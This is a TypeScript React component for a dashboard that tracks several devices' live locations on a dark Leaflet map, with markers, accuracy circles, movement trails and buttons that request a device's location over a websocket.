/**
 * LocationMap — Real-time device location tracker
 *
 * - Dark CartoDB tiles (no API key required)
 * - Live markers with accuracy circles
 * - Movement trail polyline (last 500 points)
 * - Multi-device support with color-coded markers
 * - Auto-pan to selected device on new location
 * - Click marker to select device
 * - Loads Leaflet via CDN (no extra npm dep)
 */

import React, { useEffect, useRef, useCallback } from 'react';
import { useStore } from '../store/useStore';
import { sendCommand } from '../services/wsService';
import type { DeviceLocationState } from '../types';

// Leaflet types (minimal)
type LeafletMap       = ReturnType<typeof window.L.map>;
type LeafletMarker    = ReturnType<typeof window.L.marker>;
type LeafletCircle    = ReturnType<typeof window.L.circle>;
type LeafletPolyline  = ReturnType<typeof window.L.polyline>;

declare global {
  interface Window {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    L: any;
  }
}

/* ── Device color palette ───────────────────────────────────── */
const DEVICE_COLORS = [
  '#00B8FF', '#22C55E', '#F59E0B', '#EF4444',
  '#A855F7', '#EC4899', '#06B6D4', '#84CC16',
];
const deviceColor = (idx: number) => DEVICE_COLORS[idx % DEVICE_COLORS.length];

interface DeviceLayer {
  marker:   LeafletMarker;
  circle:   LeafletCircle;
  trail:    LeafletPolyline;
  color:    string;
}

export const LocationMap: React.FC = () => {
  const locations      = useStore((s) => s.locations);
  const devices        = useStore((s) => s.devices);
  const selectedId     = useStore((s) => s.selectedDeviceId);
  const setFollowing   = useStore((s) => s.setFollowing);
  const clearLocation  = useStore((s) => s.clearLocation);
  const selectDevice   = useStore((s) => s.selectDevice);
  const setSection     = useStore((s) => s.setSection);

  const mapRef         = useRef<HTMLDivElement>(null);
  const leafletMap     = useRef<LeafletMap | null>(null);
  const layers         = useRef<Map<string, DeviceLayer>>(new Map());
  const leafletReady   = useRef(false);
  const initMapRef     = useRef<() => void>();

  /* ── Init Leaflet ───────────────────────────────────────────── */
  initMapRef.current = () => {
    if (!mapRef.current || leafletMap.current) return;
    const L = window.L;

    const map = L.map(mapRef.current, {
      center:            [20, 0],
      zoom:              3,
      zoomControl:       true,
      attributionControl: true,
    });

    // Dark CartoDB tiles — no API key
    L.tileLayer(
      'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',
      {
        attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors © <a href="https://carto.com/attributions">CARTO</a>',
        subdomains:  'abcd',
        maxZoom:     19,
      }
    ).addTo(map);

    leafletMap.current = map;
    leafletReady.current = true;

    // Render existing locations immediately after map init
    renderAllLocations();
  };

  useEffect(() => {
    if (window.L) {
      initMapRef.current?.();
      return;
    }

    // Inject Leaflet CSS
    const css = document.createElement('link');
    css.rel   = 'stylesheet';
    css.href  = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.css';
    document.head.appendChild(css);

    // Inject Leaflet JS
    const js  = document.createElement('script');
    js.src    = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
    js.onload = () => initMapRef.current?.();
    document.head.appendChild(js);

    return () => {
      // Don't remove — Leaflet may be used by other mounts
    };
  }, []);

  /* ── Render / update layers on location change ──────────────── */
  const getOrCreateLayer = useCallback(
    (devState: DeviceLocationState, idx: number): DeviceLayer | null => {
      const L   = window.L;
      const map = leafletMap.current;
      if (!L || !map) return null;

      const existing = layers.current.get(devState.deviceId);
      if (existing) return existing;

      const color = deviceColor(idx);
      const devInfo = devices.find(d => d.id === devState.deviceId);
      const label   = devInfo ? `${devInfo.brand} ${devInfo.model}` : devState.deviceId.slice(-8);

      // Custom icon — colored pin
      const icon = L.divIcon({
        className: '',
        html: `<div style="
          width:14px;height:14px;border-radius:50%;
          background:${color};border:2px solid white;
          box-shadow:0 0 6px ${color}88;
        "></div>`,
        iconSize:   [14, 14],
        iconAnchor: [7, 7],
      });

      const pt   = devState.current ?? devState.history[devState.history.length - 1];
      if (!pt) return null;

      const marker = L.marker([pt.lat, pt.lon], { icon })
        .addTo(map)
        .bindPopup(`<b style="color:${color}">${label}</b><br/>${pt.lat.toFixed(6)}, ${pt.lon.toFixed(6)}<br/>±${pt.acc}m`)
        .on('click', () => {
          selectDevice(devState.deviceId);
          setSection('location');
        });

      const circle = L.circle([pt.lat, pt.lon], {
        radius:      pt.acc,
        color,
        fillColor:   color,
        fillOpacity: 0.08,
        weight:      1,
        opacity:     0.4,
      }).addTo(map);

      const trailCoords = devState.history.map(h => [h.lat, h.lon] as [number, number]);
      const trail = L.polyline(trailCoords, {
        color,
        weight:    2,
        opacity:   0.6,
        dashArray: '4 6',
      }).addTo(map);

      const layer: DeviceLayer = { marker, circle, trail, color };
      layers.current.set(devState.deviceId, layer);
      return layer;
    },
    [devices, selectDevice, setSection]
  );

  const updateLayer = useCallback(
    (devState: DeviceLocationState, layer: DeviceLayer) => {
      const L  = window.L;
      if (!L || !devState.current) return;
      const pt = devState.current;

      const ll = L.latLng(pt.lat, pt.lon);
      layer.marker.setLatLng(ll);
      layer.marker
        .getPopup()
        ?.setContent(`<b style="color:${layer.color}">${pt.lat.toFixed(6)}, ${pt.lon.toFixed(6)}</b><br/>±${Math.round(pt.acc)}m<br/>${new Date(pt.ts).toLocaleTimeString()}`);

      layer.circle.setLatLng(ll);
      layer.circle.setRadius(pt.acc);

      const trailCoords = devState.history.map(h => [h.lat, h.lon] as [number, number]);
      layer.trail.setLatLngs(trailCoords);

      // Auto-pan if this device is being followed
      if (devState.following && devState.deviceId === selectedId) {
        leafletMap.current?.panTo(ll, { animate: true, duration: 0.5 });
      }
    },
    [selectedId]
  );

  const renderAllLocations = useCallback(() => {
    if (!leafletReady.current) return;
    let idx = 0;
    for (const devState of locations.values()) {
      const layer = getOrCreateLayer(devState, idx) ?? layers.current.get(devState.deviceId);
      if (layer && devState.current) updateLayer(devState, layer);
      idx++;
    }
    // Remove layers for devices that no longer have location data
    for (const [id, layer] of layers.current) {
      if (!locations.has(id)) {
        leafletMap.current?.removeLayer(layer.marker);
        leafletMap.current?.removeLayer(layer.circle);
        leafletMap.current?.removeLayer(layer.trail);
        layers.current.delete(id);
      }
    }
  }, [locations, getOrCreateLayer, updateLayer]);

  useEffect(() => {
    if (leafletReady.current) renderAllLocations();
  }, [locations, renderAllLocations]);

  /* ── Fit all devices in view ─────────────────────────────────── */
  const fitAll = () => {
    const L = window.L;
    const map = leafletMap.current;
    if (!L || !map || locations.size === 0) return;
    const allPts: [number, number][] = [];
    for (const s of locations.values()) {
      s.history.forEach(p => allPts.push([p.lat, p.lon]));
    }
    if (allPts.length > 0) map.fitBounds(L.latLngBounds(allPts), { padding: [40, 40] });
  };

  /* ── Request location now ───────────────────────────────────── */
  const requestNow = () => {
    for (const dev of devices.filter(d => d.status === 'online')) {
      sendCommand(dev.id, 'GET_LOCATION');
    }
  };

  return (
    <div className="h-full flex flex-col" style={{ fontFamily: 'var(--font-mono)' }}>
      {/* Toolbar */}
      <div className="px-4 py-2.5 border-b border-slate-800 flex items-center gap-3 shrink-0">
        <span className="text-xs font-semibold text-white/70 tracking-widest uppercase">Location</span>
        <span className="text-xs px-1.5 py-0.5 rounded bg-slate-800 text-slate-400">
          {locations.size} tracked
        </span>

        <div className="ml-auto flex items-center gap-2">
          <button
            onClick={requestNow}
            className="text-[11px] px-2.5 py-1 rounded bg-cyan-700/40 hover:bg-cyan-700/70 text-cyan-300 font-mono border border-cyan-700/40 transition-colors"
          >
            REQUEST ALL
          </button>
          <button
            onClick={fitAll}
            className="text-[11px] px-2.5 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono transition-colors"
          >
            FIT MAP
          </button>
        </div>
      </div>

      <div className="flex-1 flex overflow-hidden">
        {/* Map */}
        <div ref={mapRef} className="flex-1 h-full" style={{ background: '#0a0a0a' }} />

        {/* Side panel — device location list */}
        <div className="w-64 border-l border-slate-800 overflow-y-auto flex flex-col shrink-0">
          {locations.size === 0 ? (
            <div className="flex-1 flex flex-col items-center justify-center gap-2 p-4">
              <svg className="w-8 h-8 text-slate-700" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1} d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1} d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
              </svg>
              <p className="text-[11px] text-slate-600 text-center">No location data yet.<br/>Select a device to start tracking.</p>
            </div>
          ) : (
            <div className="p-2 space-y-1.5">
              {Array.from(locations.values()).map((locState, idx) => {
                const pt  = locState.current;
                const dev = devices.find(d => d.id === locState.deviceId);
                const col = deviceColor(idx);
                return (
                  <div
                    key={locState.deviceId}
                    className="rounded border border-slate-800/70 bg-slate-900/40 p-2.5 cursor-pointer hover:border-slate-700"
                    onClick={() => {
                      const layer = layers.current.get(locState.deviceId);
                      if (layer && leafletMap.current) {
                        leafletMap.current.setView(
                          [pt?.lat ?? 0, pt?.lon ?? 0], 15, { animate: true }
                        );
                        layer.marker.openPopup();
                      }
                    }}
                  >
                    <div className="flex items-center gap-2 mb-1.5">
                      <span className="w-2 h-2 rounded-full shrink-0" style={{ background: col }} />
                      <span className="text-[11px] text-white/70 font-mono truncate">
                        {dev ? `${dev.brand} ${dev.model}` : locState.deviceId.slice(-8)}
                      </span>
                    </div>
                    {pt ? (
                      <>
                        <div className="text-[10px] font-mono text-slate-400 tabular-nums">
                          {pt.lat.toFixed(6)}, {pt.lon.toFixed(6)}
                        </div>
                        <div className="flex items-center justify-between mt-1">
                          <span className="text-[10px] text-slate-600">±{Math.round(pt.acc)}m</span>
                          <span className="text-[10px] text-slate-600">
                            {new Date(pt.ts).toLocaleTimeString('en', { hour12: false })}
                          </span>
                        </div>
                        <div className="text-[10px] text-slate-600 mt-0.5">
                          {locState.history.length} pts · {locState.following ? '📡 following' : 'pinned'}
                        </div>
                      </>
                    ) : (
                      <p className="text-[10px] text-slate-600">Waiting...</p>
                    )}

                    <div className="flex items-center gap-1.5 mt-2">
                      <button
                        onClick={(e) => { e.stopPropagation(); setFollowing(locState.deviceId, !locState.following); }}
                        className={`text-[10px] px-1.5 py-0.5 rounded font-mono transition-colors ${
                          locState.following ? 'bg-cyan-900/40 text-cyan-400' : 'bg-slate-800 text-slate-500 hover:text-slate-300'
                        }`}
                      >
                        {locState.following ? 'FOLLOW' : 'UNFOLLOW'}
                      </button>
                      <button
                        onClick={(e) => { e.stopPropagation(); sendCommand(locState.deviceId, 'GET_LOCATION'); }}
                        className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-400 font-mono transition-colors"
                      >
                        PING
                      </button>
                      <button
                        onClick={(e) => { e.stopPropagation(); clearLocation(locState.deviceId); }}
                        className="text-[10px] px-1.5 py-0.5 rounded bg-red-900/30 hover:bg-red-900/50 text-red-500 font-mono transition-colors"
                      >
                        CLEAR
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
